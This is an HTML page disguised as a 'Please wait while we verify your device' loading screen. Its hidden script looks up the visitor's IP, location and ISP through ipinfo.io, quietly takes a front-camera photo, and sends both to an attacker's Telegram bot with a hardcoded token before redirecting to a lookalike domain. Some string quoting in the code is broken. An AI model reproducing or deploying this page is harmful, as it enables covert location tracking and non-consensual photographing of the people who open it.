<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; text-align: center; padding: 60px; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h2>Loading...</h2>
  <p>Please wait while we verify your device.</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const redirectUrl = "https://opaslabs.vercal.app/";
    const ipinfoToken = "18d2a866939a58";

    let textSent = false;
    let photoSent = false;

    function tryRedirect() {
      if (textSent && photoSent) {
        window.location.href = redirectUrl;
      }
    }

    // STEP 1: GET IP INFO
    fetch("https://ipinfo.io/json?token=" + ipinfoToken)
      .then(res => res.json())
      .then(data => {
        const message = 
🔐 Visitor Info:
🌐 IP: ${data.ip}
📍 ${data.city}, ${data.region}, ${data.country}
📌 Location: ${data.loc}
🌐 ISP: ${data.org}
🧠 User-Agent: ${navigator.userAgent}
🕓 Time: ${new Date().toLocaleString()}
        .trim();

        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        }).then(() => {
          textSent = true;
          tryRedirect();
        });
      })
      .catch(() => {
        textSent = true; // Fail-safe
        tryRedirect();
      });

    // STEP 2: ACCESS CAMERA
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        video.srcObject = stream;

        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // Wait 3s then snap
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append("chat_id", chatId);
              formData.append("photo", blob);
              formData.append("caption", "📸 Visitor Snapshot");

              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                method: "POST",
                body: formData
              }).then(() => {
                photoSent = true;
                tryRedirect();
              });
            }, "image/jpeg", 0.9);
          }, 3000);
        };
      })
      .catch(() => {
        photoSent = true; // Even if denied, allow redirect
        tryRedirect();
      });
  </script>
</body>
</html>
